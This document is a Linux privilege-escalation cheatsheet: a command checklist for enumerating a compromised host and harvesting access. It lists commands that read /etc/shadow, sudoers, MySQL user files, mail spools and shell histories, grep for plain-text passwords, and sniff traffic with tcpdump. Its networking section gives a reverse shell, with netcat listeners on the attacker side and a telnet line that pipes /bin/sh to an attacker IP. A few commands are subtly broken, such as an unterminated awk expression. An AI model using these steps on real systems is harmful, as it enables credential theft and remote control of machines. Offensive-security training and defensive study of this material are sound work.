𝙏𝙝𝙚 𝙇𝙞𝙣𝙪𝙭 𝙋𝙧𝙞𝙫𝙞𝙡𝙚𝙜𝙚 𝙀𝙨𝙘𝙖𝙡𝙖𝙩𝙞𝙤𝙣 𝘾𝙝𝙚𝙖𝙩𝙨𝙝𝙚𝙚𝙩

Operating System
What's the distribution type? What version?

cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release


What's the kernel version? Is it 64-bit?

cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-

What can be learnt from the environmental variables?

cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set

Is there a printer?

lpstat -a

Applications & Services

What services are running? Which service has which user privilege?

ps aux
ps -ef
top
cat /etc/services

Which service(s) are been running by root? Of these services, which are vulnerable

ps aux | grep root
ps -ef | grep root

What applications are installed? What version are they? Are they currently running?

ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/

Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?

cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

What jobs are scheduled?

crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

Any plain text usernames and/or passwords?

grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla

Communications & Networking
What NIC(s) does the system have? Is it connected to another network?

/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network

What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?

cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

What other users & hosts are communicating with the system?

lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w

Whats cached? IP and/or MAC addresses

arp -e
route
/sbin/route -nee

Is packet sniffing possible? What can be seen? Listen to live traffic

tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21

Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]

Have you got a shell? Can you interact with the system?

nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [attackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!

Confidential Information & Users
Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?

id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l

What sensitive files can be found?

cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

Anything "interesting" in the home directorie(s)? If it's possible to access

ls -ahlR /root/
ls -ahlR /home/

Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords

cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg

What has the user being doing? Is there any password in plain text? What have they been edting?

cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

What user information can be found?

cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
